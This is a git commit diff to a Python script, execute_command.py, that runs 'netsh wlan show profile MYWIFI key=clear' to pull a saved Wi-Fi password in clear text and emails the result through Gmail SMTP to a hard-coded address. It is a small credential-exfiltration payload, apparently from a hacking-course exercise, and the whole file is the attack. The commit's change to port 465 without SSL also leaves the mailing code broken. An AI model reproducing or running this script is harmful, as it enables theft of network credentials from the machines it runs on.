6b6e0fffe4c062dc40e228dd30d5cc0c2c5cd18d
developerkhashab <mohammad.khashab.mk@gmail.com>
2020-08-21 17:25:25 -0400

    fix bugs

--- Execute_command/execute_command.py
+++ Execute_command/execute_command.py
@@ -1,15 +1,16 @@
 #!usr/bin/env python3
 
-import subprocess,smtplib
+import subprocess, smtplib
 
-def send_mail(email,password,message):
-    server=smtplib.SMTP("smtp.gmail.com",587)
-    server.starttls()
-    server.login(email,password)
-    server.sendmail(email,email,message)
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 465)
+    server.ehlo()
+    server.login(email, password)
+    server.sendmail(email, email, message)
     server.quit()
 
 
 command = "netsh wlan show profile MYWIFI key=clear"
-result=subprocess.check_output(command,shell=True)
-send_mail("myemail@myemail.com","mypassword",result)
+result = subprocess.check_output(command, shell=True)
+send_mail("myemail@myemail.com", "mypassword", result)
